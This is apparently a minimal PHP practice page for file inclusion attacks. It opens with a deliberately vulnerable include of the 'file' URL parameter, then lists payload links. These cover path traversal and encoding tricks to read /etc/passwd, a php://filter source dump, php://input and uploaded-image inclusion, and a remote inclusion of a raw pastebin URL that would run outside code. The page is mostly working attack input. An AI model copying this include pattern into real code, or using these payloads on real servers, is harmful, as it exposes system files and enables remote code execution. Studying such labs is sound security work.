<html>

<?php include($_GET['file']) ?>

<h3>LFI</h3>
<h5>Path Traversal</h5>

<a href="?file=../../../../../etc/passwd">?file=../../../../../etc/passwd</a>

<h6>Null Bytes</h6>

<a href="?file=../../../../../etc/passwd">?file=../../../../../etc/passwd%00</a>

<h6>Url Encode</h6>

<a href="?file=%2F%2F%2F%2F%2Fetc%2Fpasswd">?file=%2F%2F%2F%2F%2Fetc%2Fpasswd</a>

<a href="?file=%252F%252F%252F%252F%252Fetc%252Fpasswd">?file=%252F%252F%252F%252F%252Fetc%252Fpasswd</a>
<h5>Wrapper</h5>

<h6>PHP Filters</h6>

<a href="?file=php://filter/read=convert.base64-encode/resource=index.php">?file=php://filter/read=convert.base64-encode/resource=index.php</a>


<h3>RFI</h3>

<a href="?file=https://google.fr">?file=https://google.fr</a>

<a href="?file=https://pastebin.com/raw/QsPTKtH1">?file=https://pastebin.com/raw/QsPTKtH1</a>

<h5>Wrapper</h5>   

<h6>PHP Input</h6>

<a href="?file=php://input">?file=php://input</a>


<h6>PHP Upload</h6>

<a href="?file=upload/file.jpg">?file=upload/file.jpg</a>


</html>
